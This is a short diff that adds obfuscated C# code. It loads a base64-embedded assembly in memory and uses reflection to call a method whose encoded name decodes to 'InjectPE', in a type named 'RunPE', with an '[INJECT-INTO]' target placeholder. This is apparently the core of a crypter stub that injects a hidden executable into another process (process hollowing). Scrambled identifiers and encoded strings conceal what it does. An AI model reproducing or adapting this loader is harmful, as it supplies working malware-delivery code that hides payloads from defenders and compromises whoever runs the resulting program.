@@ -1,0 +1,9 @@
+//string RPP24 = ;
+//byte[] RAA1P3 = ;
+//MessageBox.Show(Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8))).GetTypes()[5].ToString());
+//Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8))).GetTypes()[5].GetMethod(Encoding.Default.GetString(Convert.FromBase64String("SW5qZWN0UEU="))).Invoke(null, new object[] {KKKKK1 , true, "[INJECT-INTO]", ".exe", true, false });
+//Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8))).GetTypes()[5].InvokeMember(Encoding.Default.GetString(Convert.FromBase64String("SW5qZWN0UEU=")), BindingFlags.InvokeMethod, null, null, new object[] {KKKKK1 , true, "[INJECT-INTO]", ".exe", true, false });
+Assembly AA2FF2KK1a = Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8)));
+			foreach (MethodInfo KK9JJ3lCC1BB3 in AA2FF2KK1a.GetType(Encoding.Default.GetString(Convert.FromBase64String("UnVuUEU="))).GetMethods()) { 
+				if (KK9JJ3lCC1BB3.Name.ToString() == Encoding.Default.GetString(Convert.FromBase64String("SW5qZWN0UEU=")).ToString())
+					KK9JJ3lCC1BB3.Invoke(null, new object[] {KKKKK1 , true, "[INJECT-INTO]", ".exe", true, false });}
